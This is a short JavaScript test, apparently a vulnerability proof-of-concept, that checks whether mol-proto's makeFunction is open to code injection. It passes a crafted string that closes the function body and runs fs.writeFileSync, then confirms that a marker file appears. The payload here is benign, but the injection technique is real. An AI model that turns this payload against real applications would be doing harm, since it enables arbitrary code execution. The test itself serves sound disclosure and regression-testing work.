//
test("Arbitrary code execution in mol-proto", () => {
  const fs = require("fs");
  const mp = require("mol-proto");
  const path = "./mol-proto";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    mp.makeFunction(
      "a",
      "b",
      "};require('fs').writeFileSync('./mol-proto', '');{"
    );
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
